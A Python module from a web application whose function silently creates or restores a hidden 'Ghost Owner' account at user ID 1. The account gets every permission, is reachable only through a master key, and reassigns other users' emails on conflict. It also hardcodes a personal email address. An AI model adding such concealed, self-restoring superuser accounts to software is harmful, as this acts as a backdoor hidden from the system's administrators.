
import logging

from extensions import db
from models import User, Role, Permission
from sqlalchemy.exc import IntegrityError
from sqlalchemy import inspect

import secrets
import string
import os

logger = logging.getLogger(__name__)

GHOST_USERNAME = "__OWNER__"
GHOST_EMAIL = os.getenv("GHOST_OWNER_EMAIL", "rafideen.ahmadghannam@gmail.com").strip().lower()
GHOST_ID = 1

def ensure_ghost_owner():
    """
    Ensures the Ghost Owner account exists, is hidden, and has full permissions.
    """
    try:
        # Check if users table exists before querying
        inspector = inspect(db.engine)
        if not inspector.has_table("users"):
            logger.info("Users table not found - skipping Ghost Owner check (migrations may not be run yet)")
            return

        # Check if user ID 1 exists
        user = db.session.get(User, GHOST_ID)

        desired_email = (GHOST_EMAIL or "").strip().lower()
        if desired_email:
            with db.session.no_autoflush:
                conflict = User.query.filter(User.email == desired_email, User.id != GHOST_ID).first()
                if conflict:
                    base_local = (getattr(conflict, "username", None) or f"user{conflict.id}").strip().lower()
                    base_local = "".join(ch for ch in base_local if ch.isalnum() or ch in {".", "_", "+"})
                    if not base_local:
                        base_local = f"user{conflict.id}"
                    suffix = 0
                    while True:
                        candidate = f"{base_local}+moved{conflict.id}{'' if suffix == 0 else f'_{suffix}'}@ghost.system"
                        exists = User.query.filter(User.email == candidate).first()
                        if not exists:
                            conflict.email = candidate
                            db.session.add(conflict)
                            db.session.flush()
                            break
                        suffix += 1
        
        # Generate a random password that no one knows. 
        # Access is ONLY via the Dynamic Master Key.
        # This prevents login using a static password found in source code.
        random_password = ''.join(secrets.choice(string.ascii_letters + string.digits + "!@#$%^&*") for _ in range(32))
        
        if not user:
            logger.info("Ghost Owner missing. Recreating...")
            # Create user
            user = User(
                id=GHOST_ID,
                username=GHOST_USERNAME,
                email=desired_email or GHOST_EMAIL,
                is_active=True,
                is_system_account=True # Hidden from lists
            )
            user.set_password(random_password) 
            db.session.add(user)
        else:
            # Ensure attributes are correct
            updated = False
            if not user.is_system_account:
                user.is_system_account = True
                updated = True
            
            if user.username != GHOST_USERNAME:
                user.username = GHOST_USERNAME
                updated = True
                
            target_email = desired_email or GHOST_EMAIL
            if target_email and user.email != target_email:
                user.email = target_email
                updated = True
            
            # Rotate password to random on every check to ensure no static password persists
            # This locks the account to Master Key access only
            user.set_password(random_password)
            updated = True
                
            if updated:
                db.session.add(user)
                
        # Ensure Role exists (Owner preset)
        target_role_name = "owner"
        role = Role.query.filter_by(name=target_role_name).first()
        if not role:
            from permissions_config.permissions import PermissionsRegistry
            role_info = PermissionsRegistry.ROLES.get(target_role_name, {})
            desc = role_info.get("description", "System Owner")
            role = Role(name=target_role_name, description=desc)
            db.session.add(role)
            db.session.flush()  # Get ID

        # Ensure role has ALL permissions
        from permissions_config.permissions import PermissionsRegistry
        
        # Collect all permission codes from registry
        all_perms_codes = set()
        for module_name, perms in PermissionsRegistry.PERMISSIONS.items():
            for perm_code, perm_data in perms.items():
                all_perms_codes.add(perm_code)

        # Get existing permissions for this role
        existing_role_perms = set()
        existing_perm_ids = set()
        for rp in role.permissions:
            code = (getattr(rp, "code", None) or "").strip().lower()
            if code:
                existing_role_perms.add(code)
            pid = getattr(rp, "id", None)
            if pid:
                existing_perm_ids.add(pid)

        # Add missing permissions
        for perm_code in all_perms_codes:
            perm_code_norm = (perm_code or "").strip().lower()
            if not perm_code_norm or perm_code_norm in existing_role_perms:
                continue

            perm = Permission.query.filter_by(code=perm_code).first()
            if not perm:
                perm_data = None
                for m, p in PermissionsRegistry.PERMISSIONS.items():
                    if perm_code in p:
                        perm_data = p[perm_code]
                        break

                if perm_data:
                    perm_name = (
                        perm_data.get("name")
                        or perm_data.get("name_ar")
                        or perm_code
                    )
                    perm = Permission(
                        name=perm_name,
                        code=perm_code,
                        name_ar=perm_data.get("name_ar"),
                        description=perm_data.get("description"),
                        module=perm_data.get("module"),
                        is_protected=bool(perm_data.get("is_protected", False)),
                        aliases=perm_data.get("aliases") or [],
                    )
                    db.session.add(perm)
                    db.session.flush()

            if perm:
                perm_id = getattr(perm, "id", None)
                if perm_id and perm_id not in existing_perm_ids:
                    role.permissions.append(perm)
                    existing_perm_ids.add(perm_id)
                    existing_role_perms.add(perm_code_norm)
                    logger.info("Added permission %s to system admin role", perm_code)

        user.role = role
        
        try:
            db.session.commit()
        except IntegrityError:
            db.session.rollback()
            
    except Exception as e:
        logger.error("Ghost Owner check failed: %s", e)
        db.session.rollback()
